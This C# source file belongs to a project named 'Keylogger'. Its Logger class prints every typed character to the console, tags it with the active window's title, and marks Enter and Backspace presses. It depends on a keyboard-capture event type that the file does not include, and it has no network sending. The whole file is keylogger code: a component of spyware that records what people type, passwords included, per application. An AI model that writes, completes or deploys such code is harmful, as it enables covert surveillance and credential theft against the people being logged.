using System;
using System.Windows.Forms;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Keylogger
{
    class Logger
    {
        string lastWindow = "";
        public Logger()
        {

        }

        public void KeyDown(CatcherEventArgs args)
        {
            if (lastWindow != args.WindowName)
            {
                Console.WriteLine();
                Console.WriteLine(string.Format("[{0}]", args.WindowName));
                lastWindow = args.WindowName;
            }
            if(args.Key == Keys.Enter)
            {
                Console.WriteLine("[Enter]");
            }
            else if (args.Key == Keys.Back)
            {
                Console.Write("[Back]");
            }
            else if (!args.IsSystemKey)
            { 
                Console.Write(args.UnicodeValue);
            }    
        }

        public void KeyUp(CatcherEventArgs args)
        {
            //Console.WriteLine(args.UnicodeValue + " - Up");
        }
    }
}
